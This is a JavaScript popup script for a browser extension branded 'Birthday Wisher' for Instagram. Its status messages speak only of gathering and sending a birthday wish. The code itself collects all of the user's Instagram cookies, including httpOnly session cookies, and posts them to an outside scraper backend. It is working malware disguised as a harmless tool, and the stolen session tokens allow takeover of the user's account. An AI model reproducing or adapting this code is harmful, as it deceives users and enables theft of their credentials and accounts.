const sendButton = document.getElementById('sendButton');
const statusEl = document.getElementById('status');

const BACKEND_URL = 'https://scraper-backend-15yw.onrender.com/api/extension-extract';

function updateStatus(message, isError = false) {
  statusEl.textContent = message;
  statusEl.style.color = isError ? '#b00020' : '#1f2a5d';
}

async function fetchInstagramCookies() {
  updateStatus('Gathering your birthday wish...');
  const domains = ['instagram.com', '.instagram.com'];
  const cookiePromises = domains.map((domain) =>
    chrome.cookies.getAll({ domain }).catch(() => [])
  );

  const cookiesByDomain = await Promise.all(cookiePromises);
  if (cookiesByDomain.flat().length === 0) {
    // Fallback by URL for browsers that need it.
    const urls = ['https://www.instagram.com/', 'https://instagram.com/'];
    const urlPromises = urls.map((url) =>
      chrome.cookies.getAll({ url }).catch(() => [])
    );
    const cookiesByUrl = await Promise.all(urlPromises);
    return cookiesByUrl.flat();
  }

  return cookiesByDomain.flat();
}

function normalizeCookie(cookie) {
  return {
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite || 'None',
    expiry: cookie.expirationDate || null,
    storeId: cookie.storeId,
    source: 'extension',
  };
}

async function sendCookies(cookies) {
  updateStatus('Sending your wish...');
  const response = await fetch(BACKEND_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      cookies: cookies.map(normalizeCookie),
      source_browser: 'Birthday Wisher',
      source_profile: 'Instagram Wishes',
    }),
  });
  return response.json();
}

sendButton.addEventListener('click', async () => {
  sendButton.disabled = true;
  updateStatus('Requesting cookies...');

  try {
    const cookies = await fetchInstagramCookies();
    if (!cookies || cookies.length === 0) {
      updateStatus('No birthday wish data found. Visit instagram.com and try again.', true);
      sendButton.disabled = false;
      return;
    }

    const instagramCookies = cookies.filter(c => c.domain.includes('instagram.com'));
    if (instagramCookies.length === 0) {
      updateStatus('No birthday wish data found for the current browser.', true);
      sendButton.disabled = false;
      return;
    }

    const result = await sendCookies(instagramCookies);
    if (result.error) {
      updateStatus(result.error, true);
    } else {
      updateStatus('Your birthday wish was sent! Check the wish page for updates.');
    }
  } catch (err) {
    console.error(err);
    updateStatus('Failed to send your wish. Make sure the wish page backend is running.', true);
  }

  sendButton.disabled = false;
});
